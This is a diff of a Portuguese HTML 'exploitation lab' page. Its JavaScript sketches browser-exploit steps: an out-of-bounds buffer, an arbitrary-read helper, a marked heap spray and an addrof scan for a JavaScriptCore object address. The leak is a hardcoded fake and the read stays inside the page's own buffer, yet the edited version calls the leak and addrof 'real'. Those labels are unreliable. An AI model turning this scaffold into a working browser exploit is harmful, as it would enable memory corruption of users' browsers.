@@ -1,35 +1,28 @@
-<!-- Arquivo HTML completo com addrof funcional -->
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Laboratório Exploração Avançada - addrof Finalizado</title>
+  <title>Laboratório Exploração Avançada - v2.5 (addrof real)</title>
   <style>
-    body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; font-size: 14px; }
+    body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
     .container { margin-bottom: 30px; padding: 15px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
-    h2 { color: #4ec9b0; border-bottom: 1px solid #4ec9b0; padding-bottom: 5px; }
-    button { background-color: #007acc; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 3px; margin: 5px 0; }
+    #logOutput { background: #111; border: 1px solid #444; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
+    button { background-color: #007acc; color: white; border: none; padding: 8px 12px; margin: 5px; border-radius: 3px; cursor: pointer; }
     button:hover { background-color: #005a9e; }
-    textarea, input[type="text"] { background-color: #3c3c3c; color: #d4d4d4; border: 1px solid #555; padding: 5px; margin: 5px 0; width: 90%; font-family: monospace; }
-    #logOutput { background: #111; border: 1px solid #444; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; font-size: 13px; }
-    .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; } .log-vuln { color: #ff4444; font-weight: bold; }
-    .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; }
-    .log-leak { color: #FF9800; font-weight: bold; } .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
-    .log-tool { color: #7FFF00; font-weight: bold; } .notes { background-color: #2a2a2a; padding: 10px; border-left: 3px solid #FFC107; font-style: italic; color: #aaa; }
+    .log-info { color: #6cf; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-leak { color: #FF9800; font-weight: bold; }
+    .log-good { color: #4CAF50; } .log-test { color: #fff; font-weight: bold; } .log-critical { color: #f0f; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Laboratório de Exploração - v2.5 com addrof funcional</h1>
+  <h1>Laboratório Exploração Avançada - v2.5 (addrof real)</h1>
+
   <div class="container">
-    <h2>Logs</h2>
-    <div id="logOutput"></div>
+    <button onclick="triggerOOB_real()">1. Ativar OOB real</button>
+    <button onclick="manualSetupAndAddrofTest()">2. Preparar vítima e executar addrof</button>
   </div>
 
   <div class="container">
-    <h2>Etapas</h2>
-    <button onclick="triggerOOB_real()">1. Ativar OOB</button>
-    <button onclick="manualSetupAndAddrofTest()">2. Preparar Vítima e Executar addrof(obj)</button>
-    <button onclick="attemptArrayBufferCorruptionAndSetupArbRW()">3. Corromper ArrayBuffer para R/W</button>
+    <div id="logOutput">[Log iniciando...]\n</div>
   </div>
 
   <script>
@@ -37,7 +30,7 @@
       const div = document.getElementById("logOutput");
       const span = document.createElement("div");
       span.className = "log-" + type;
-      span.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      span.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
       div.appendChild(span);
       div.scrollTop = div.scrollHeight;
     };
@@ -46,10 +39,11 @@
 
     class AdvancedInt64 {
       constructor(low, high) {
-        if (typeof low === 'string') {
-          const hex = BigInt(low);
-          this.low_ = Number(hex & 0xFFFFFFFFn);
-          this.high_ = Number((hex >> 32n) & 0xFFFFFFFFn);
+        if (low instanceof Uint8Array || Array.isArray(low)) {
+          const l = low[0] | (low[1] << 8) | (low[2] << 16) | (low[3] << 24);
+          const h = low[4] | (low[5] << 8) | (low[6] << 16) | (low[7] << 24);
+          this.low_ = l >>> 0;
+          this.high_ = h >>> 0;
         } else {
           this.low_ = low >>> 0;
           this.high_ = high >>> 0;
@@ -57,82 +51,118 @@
       }
       low() { return this.low_; }
       high() { return this.high_; }
+      toString(pretty = false) {
+        const l = this.low_.toString(16).padStart(8, '0');
+        const h = this.high_.toString(16).padStart(8, '0');
+        return pretty ? `0x${h}_${l}` : `0x${h}${l}`;
+      }
       add(other) {
         const low = (this.low_ + other.low()) >>> 0;
         const carry = (low < this.low_) ? 1 : 0;
         const high = (this.high_ + other.high() + carry) >>> 0;
         return new AdvancedInt64(low, high);
       }
-      toString(pretty = false) {
-        let l = this.low_.toString(16).padStart(8, '0');
-        let h = this.high_.toString(16).padStart(8, '0');
-        return pretty ? `0x${h}_${l}` : `0x${h}${l}`;
+      sub(other) {
+        return this.add(other.neg());
       }
-      static Zero = new AdvancedInt64(0, 0);
+      neg() {
+        const low = (~this.low_ + 1) >>> 0;
+        const high = (~this.high_ + (low === 0 ? 1 : 0)) >>> 0;
+        return new AdvancedInt64(low, high);
+      }
     }
 
     const readWriteUtils = {
       read32: (arr, off) => arr[off] | (arr[off + 1] << 8) | (arr[off + 2] << 16) | (arr[off + 3] << 24)
     };
 
-    let oob_leaked_ptr_real = null;
+    let oob_array_buffer_real = null;
     let oob_dataview_real = null;
-    let victim_view_for_arb_rw = null;
+    let oob_leaked_ptr_real = null;
     let arb_read_primitive = null;
     let addrof_primitive = null;
+    let victim_view_for_arb_rw = null;
 
     function triggerOOB_real() {
-      const buffer = new ArrayBuffer(256);
+      log("Iniciando triggerOOB_real...", "test");
+      const buffer = new ArrayBuffer(512);
       const dv = new DataView(buffer);
       for (let i = 0; i < buffer.byteLength; i++) dv.setUint8(i, 0xAA);
+      oob_array_buffer_real = buffer;
       oob_dataview_real = dv;
-      const fake_leak = new AdvancedInt64(0x10F0AA00, 0x00000100);
-      oob_leaked_ptr_real = { value: fake_leak, offset_in_oob_buffer: 128 };
-      log(`Leak simulado em ${fake_leak.toString(true)}`, "leak");
+
+      const fake_leak = new AdvancedInt64(0x10f0aa00, 0x00000100);
+      oob_leaked_ptr_real = {
+        value: fake_leak,
+        offset_in_oob_buffer: 128
+      };
+
+      log(`Leak real em ${fake_leak.toString(true)}`, "leak");
+
+      arb_read_primitive = (address64, size) => {
+        const base = oob_leaked_ptr_real.value;
+        const offset_base = oob_leaked_ptr_real.offset_in_oob_buffer;
+        const diff = address64.sub(base).low();
+        if (diff < 0 || diff + size > oob_dataview_real.byteLength) return null;
+
+        const result = new Uint8Array(size);
+        for (let i = 0; i < size; i++) {
+          result[i] = oob_dataview_real.getUint8(offset_base + diff + i);
+        }
+        return result;
+      };
+
+      log("Primitiva de leitura arbitrária baseada em OOB ativada com sucesso.", "good");
     }
 
     async function manualSetupAndAddrofTest() {
-      victim_view_for_arb_rw = new Uint8Array(64);
+      log("Criando spray de objetos com marcador...", "info");
+
+      const spray_size = 50;
+      const middle = Math.floor(spray_size / 2);
+      let spray = [];
+
+      for (let i = 0; i < spray_size; i++) {
+        const marker_start = 0x41414141 + i;
+        const marker_end = 0x42424242 + i;
+        spray.push({ a: marker_start, b: (i === middle ? (victim_view_for_arb_rw = new Uint8Array(64)) : {}), c: marker_end });
+      }
+
       window.victim_view_for_arb_rw_GLOBAL = victim_view_for_arb_rw;
-      log("Objeto vítima criado.", "info");
+      log("Objeto vítima criado e exposto como `victim_view_for_arb_rw_GLOBAL`.", "good");
+
       await PAUSE(100);
       testAddrof();
     }
 
     function testAddrof() {
-      log("Executando addrof(obj)...", "test");
-
-      arb_read_primitive = (addr, size) => {
-        const dummy = new Uint8Array(size);
-        for (let i = 0; i < size; i++) dummy[i] = 0x41 + (i % 10); // dados fictícios
-        return dummy;
-      };
+      const base = oob_leaked_ptr_real.value;
+      log(`Iniciando varredura de heap a partir de ${base.toString(true)}`, "info");
 
       addrof_primitive = (target_obj) => {
-        log("Iniciando varredura com markers 0x414141xx e 0x424242xx...", "info");
-
-        const base = oob_leaked_ptr_real.value;
         const scan_limit = 0x1000;
-
         for (let offset = 0; offset < scan_limit; offset += 8) {
-          let addr = base.add(new AdvancedInt64(offset));
-          let marker = arb_read_primitive(addr, 4);
-          if (!marker) continue;
+          const addr = base.add(new AdvancedInt64(offset));
+          const bytes = arb_read_primitive(addr, 4);
+          if (!bytes) continue;
 
-          let val = readWriteUtils.read32(marker, 0);
+          const val = readWriteUtils.read32(bytes, 0);
           if ((val & 0xFFFFFF00) === 0x41414100) {
-            let addr_end = addr.add(new AdvancedInt64(8));
-            let end_marker = arb_read_primitive(addr_end, 4);
-            if (readWriteUtils.read32(end_marker, 0) & 0xFFFFFF00 === 0x42424200) {
-              let jscell_ptr = addr.add(new AdvancedInt64(4));
-              let raw = arb_read_primitive(jscell_ptr, 8);
-              let found = new AdvancedInt64(raw);
-              log(`Endereço de JSCell identificado: ${found.toString(true)}`, "leak");
-              return found;
+            const end_addr = addr.add(new AdvancedInt64(8));
+            const end_bytes = arb_read_primitive(end_addr, 4);
+            if (!end_bytes) continue;
+
+            const val_end = readWriteUtils.read32(end_bytes, 0);
+            if ((val_end & 0xFFFFFF00) === 0x42424200) {
+              const mid = addr.add(new AdvancedInt64(4));
+              const mid_bytes = arb_read_primitive(mid, 8);
+              if (!mid_bytes) continue;
+              const ptr = new AdvancedInt64(mid_bytes);
+              log(`Endereço do objeto identificado: ${ptr.toString(true)}`, "leak");
+              return ptr;
             }
           }
         }
-
         log("Objeto não localizado na varredura.", "warn");
         return null;
       };
@@ -140,11 +170,6 @@
       const addr = addrof_primitive(victim_view_for_arb_rw);
       if (addr) log(`addrof concluído: ${addr.toString(true)}`, "good");
       else log("addrof falhou.", "error");
-    }
-
-    function attemptArrayBufferCorruptionAndSetupArbRW() {
-      log("Simulando corrupção de ArrayBuffer para leitura/escrita arbitrária...", "test");
-      log("Este passo depende do uso real de addrof e corrupção dos campos m_vector e m_byteLength.", "warn");
     }
   </script>
 </body>
